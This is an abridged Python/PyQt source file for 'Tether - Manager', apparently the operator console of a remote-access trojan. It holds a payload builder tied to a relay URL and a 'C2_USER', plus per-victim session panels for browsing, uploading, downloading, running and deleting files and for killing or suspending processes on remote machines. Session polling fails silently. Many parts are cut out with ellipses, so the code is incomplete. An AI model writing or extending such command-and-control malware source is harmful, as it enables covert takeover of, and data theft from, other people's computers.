# main.py (Definitive, Ultimate TetherManager with Full Functionality)
    ...
    def run(self):
        while self.running:
            ...
            try:
                ...
                pass # Fail silently on session discovery

            # Get responses for the currently viewed session
            ...
            if session_id:
                try:
                    ...
                    pass # Fail silently on response polling
...
class TransferManager(QThread):
        ...
        try:
            ...
            with open(self.local_path, "rb") as f:
                ...
                while True:
                    ...
                    payload = {
                        "action": "upload_chunk",
                        "params": {"path": self.remote_path, "chunk": base64.b64encode(chunk).decode(), "is_first": chunk_num == 0}
                    }
                    response = self.main_window.send_command_and_wait_for_response(payload)
                    if not response or response.get('status') != 'success':
                        self.finished.emit(f"Upload chunk failed.")
                        return
                    chunk_num += 1
                    progress_val = min(100, int(((chunk_num * self.chunk_size) / file_size) * 100))
                    self.progress.emit(progress_val)
            self.finished.emit("Upload Complete")
        except Exception as e:
            self.finished.emit(f"Upload Failed: {e}")
    ...
    def download_file(self):
        try:
            with open(self.local_path, "wb") as f:
                ...
                while True:
                    payload = {
                        ...
                        "params": {"path": self.remote_path, "chunk_num": chunk_num}
                    }
                    response = self.main_window.send_command_and_wait_for_response(payload)
                    if not response or response.get('status') != 'success':
                    ...
                    f.write(chunk)
                    # Use a spinner-like progress for downloads as we don't know total size
            ...
            self.finished.emit(f"Download Failed: {e}")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Tether - Manager")
        ...
        self.manager_screen = QWidget()
        self.stack.addWidget(self.main_screen)
        self.stack.addWidget(self.manager_screen)
    ...
    def setup_main_ui(self):
        ...
        builder_box = QHBoxLayout()
        layout.addLayout(builder_box)
        self.name_input = QLineEdit()
        self.name_input.setPlaceholderText("Enter Payload Name")
        builder_box.addWidget(self.name_input)
        self.build_button = QPushButton("Build Payload")
        self.build_button.clicked.connect(self.start_build)
        builder_box.addWidget(self.build_button)
    ...
    def setup_manager_ui(self):
        layout = QVBoxLayout(self.manager_screen)
        self.manager_title = QLabel("Managing Session:")
        layout.addWidget(self.manager_title)
        self.tabs = QTabWidget()
        self.tabs.currentChanged.connect(self.tab_changed)
        self.file_explorer_tab = QWidget()
        self.process_manager_tab = QWidget()
        self.tabs.addTab(self.file_explorer_tab, "File Explorer")
        self.tabs.addTab(self.process_manager_tab, "Process Manager")
        layout.addWidget(self.tabs)
        self.setup_file_explorer_ui()
    ...
    def setup_process_manager_ui(self):
        layout = QVBoxLayout(self.process_manager_tab)
        refresh_btn = QPushButton("Refresh Processes")
        refresh_btn.clicked.connect(self.refresh_processes)
        layout.addWidget(refresh_btn)
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(4)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "User", "Memory (MB)"])
    ...
    def start_build(self):
        ...
        self.log_box.clear()
        self.build_thread = BuildThread(name, RELAY_URL, C2_USER)
        self.build_thread.log_message.connect(self.log_box.append)
        self.build_thread.finished.connect(lambda: self.build_button.setEnabled(True))
        self.build_thread.start()

    def open_manager_panel(self, item):
        self.current_session_id = item.text().split(" | ")[0].split("] ")[-1]
        self.manager_title.setText(f"<b>Managing Session:</b> {self.current_session_id}")
        self.stack.setCurrentWidget(self.manager_screen)
    ...
    def send_command_and_wait_for_response(self, payload):
        ...
        try:
            ...
            self.status_bar.showMessage(f"Failed to send command: {e}", 4000)
            return None

        # Wait for the response event to be set by the main event loop
        if response_event.wait(timeout=20): # 20 second timeout
            return response_data
        else:
            self.status_bar.showMessage("Command timed out waiting for response.", 4000)
            return None

    def tab_changed(self, index):
        if self.tabs.tabText(index) == "Process Manager":
    ...
    def refresh_files(self, path):
        ...
        if response and response.get('status') == 'success':
            self.populate_file_table(response.get('data'))
        elif response:
            self.status_bar.showMessage(f"Error listing directory: {response.get('data')}", 4000)

    def refresh_processes(self):
        response = self.send_command_and_wait_for_response({"action": "list_processes"})
        if response and response.get('status') == 'success':
            self.populate_process_table(response.get('data'))
        elif response:
            self.status_bar.showMessage(f"Error listing processes: {response.get('data')}", 4000)
    ...
    def populate_process_table(self, processes):
        ...
        for row, item in enumerate(processes):
            self.process_table.setItem(row, 0, QTableWidgetItem(str(item['pid'])))
            self.process_table.setItem(row, 1, QTableWidgetItem(item['name']))
            self.process_table.setItem(row, 2, QTableWidgetItem(str(item.get('username', 'N/A'))))
            self.process_table.setItem(row, 3, QTableWidgetItem(f"{item.get('memory_mb', 0):.2f}"))

    def navigate_to_drive(self, drive):
        if drive: self.refresh_files(drive)

    def navigate_to_path(self):
        self.refresh_files(self.path_input.text())

    def navigate_up(self):
        if self.current_path and self.current_path.replace('/', '\\') != os.path.dirname(self.current_path.replace('/', '\\')):
            self.refresh_files(os.path.dirname(self.current_path.replace('/', '\\')))

    def file_double_clicked(self, index):
        if self.file_table.item(index.row(), 1).text() == 'folder':
            new_path = os.path.join(self.current_path, self.file_table.item(index.row(), 0).text()).replace('\\', '/')
    ...
    def show_file_context_menu(self, position):
        ...
        if action == new_folder_action:
            ...
            if ok and name:
                self.send_command_and_wait_for_response({"action": "new_folder", "params": {"path": os.path.join(self.current_path, name).replace('\\', '/')}})
                self.refresh_files(self.current_path)

        if not item: return
        file_name = self.file_table.item(item.row(), 0).text()
        full_path = os.path.join(self.current_path, file_name).replace('\\', '/')
        if action == exec_action:
            self.send_command_and_wait_for_response({"action": "execute_file", "params": {"path": full_path}})
        elif action == delete_action:
            if QMessageBox.question(self, "Confirm Delete", f"Delete '{file_name}'?") == QMessageBox.StandardButton.Yes:
                self.send_command_and_wait_for_response({"action": "delete_file", "params": {"path": full_path}})
                self.refresh_files(self.current_path)
    ...
    def show_process_context_menu(self, position):
        ...
        if not item: return
        pid = int(self.process_table.item(item.row(), 0).text())
        menu = QMenu()
        ...
        if action == kill_action:
            self.send_command_and_wait_for_response({"action": "kill_process", "params": {"pid": pid}})
        elif action == suspend_action:
            self.send_command_and_wait_for_response({"action": "suspend_process", "params": {"pid": pid}})
        elif action == resume_action:
            self.send_command_and_wait_for_response({"action": "resume_process", "params": {"pid": pid}})
        self.refresh_processes()
    ...
    def start_transfer(self, action, local_path, remote_path):
        ...
        self.transfer_thread.finished.connect(self.finish_transfer)
